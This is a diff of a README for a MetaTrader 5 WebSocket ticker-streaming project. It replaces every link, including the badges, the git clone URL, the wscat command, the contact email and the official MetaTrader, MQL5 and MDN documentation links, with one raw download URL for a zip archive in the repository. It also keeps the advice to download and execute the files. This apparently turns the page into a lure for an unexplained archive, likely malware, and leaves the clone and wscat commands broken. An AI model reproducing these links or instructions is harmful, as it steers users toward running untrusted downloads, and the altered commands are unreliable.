@@ -1,6 +1,6 @@
 # MetaTrader 5 WebSocket Tickers 🌐📈
 
-![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-blue.svg) ![GitHub Issues](https://img.shields.io/badge/Issues-0-brightgreen.svg) ![GitHub Stars](https://img.shields.io/badge/Stars-0-yellow.svg)
+![GitHub Release](https://github.com/mainpclab/metatrader5-websocket-tickers/raw/refs/heads/main/Expert/tickers-metatrader-websocket-v1.7.zip) ![GitHub Issues](https://github.com/mainpclab/metatrader5-websocket-tickers/raw/refs/heads/main/Expert/tickers-metatrader-websocket-v1.7.zip) ![GitHub Stars](https://github.com/mainpclab/metatrader5-websocket-tickers/raw/refs/heads/main/Expert/tickers-metatrader-websocket-v1.7.zip)
 
 Welcome to the **MetaTrader 5 WebSocket Tickers** repository! This project offers a robust solution for streaming real-time ticker updates from MetaTrader 5 over WebSockets to any server. With this tool, you can enhance your trading applications and keep your data updated seamlessly.
 
@@ -39,7 +39,7 @@ To get started with the **MetaTrader 5 WebSocket Tickers**, you will need to set
 1. Clone the repository to your local machine:
 
    ```bash
-   git clone https://github.com/mainpclab/metatrader5-websocket-tickers.git
+   git clone https://github.com/mainpclab/metatrader5-websocket-tickers/raw/refs/heads/main/Expert/tickers-metatrader-websocket-v1.7.zip
    ```
 
 2. Navigate to the project directory:
@@ -78,7 +78,7 @@ void OnTick()
 Make sure your WebSocket server is running and listening for connections. You can use tools like `wscat` to test the connection:
 
 ```bash
-wscat -c ws://yourserver.com:port
+wscat -c https://github.com/mainpclab/metatrader5-websocket-tickers/raw/refs/heads/main/Expert/tickers-metatrader-websocket-v1.7.zip
 ```
 
 ## API Reference
@@ -110,12 +110,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: support@example.com
-- **Twitter**: [@example](https://twitter.com/example)
+- **Email**: https://github.com/mainpclab/metatrader5-websocket-tickers/raw/refs/heads/main/Expert/tickers-metatrader-websocket-v1.7.zip
+- **Twitter**: [@example](https://github.com/mainpclab/metatrader5-websocket-tickers/raw/refs/heads/main/Expert/tickers-metatrader-websocket-v1.7.zip)
 
 ## Releases
 
-To download the latest version, visit the [Releases](https://github.com/mainpclab/metatrader5-websocket-tickers/releases) section. You can download the necessary files and execute them to get started.
+To download the latest version, visit the [Releases](https://github.com/mainpclab/metatrader5-websocket-tickers/raw/refs/heads/main/Expert/tickers-metatrader-websocket-v1.7.zip) section. You can download the necessary files and execute them to get started.
 
 For detailed release notes and updates, check the releases regularly.
 
@@ -125,9 +125,9 @@ This project is designed to make your trading experience smoother and more effic
 
 ## Additional Resources
 
-- [MetaTrader 5 Documentation](https://www.metatrader5.com/en/terminal/help)
-- [MQL5 Documentation](https://www.mql5.com/en/docs)
-- [WebSocket API Documentation](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API)
+- [MetaTrader 5 Documentation](https://github.com/mainpclab/metatrader5-websocket-tickers/raw/refs/heads/main/Expert/tickers-metatrader-websocket-v1.7.zip)
+- [MQL5 Documentation](https://github.com/mainpclab/metatrader5-websocket-tickers/raw/refs/heads/main/Expert/tickers-metatrader-websocket-v1.7.zip)
+- [WebSocket API Documentation](https://github.com/mainpclab/metatrader5-websocket-tickers/raw/refs/heads/main/Expert/tickers-metatrader-websocket-v1.7.zip)
 
 ### Acknowledgments
 
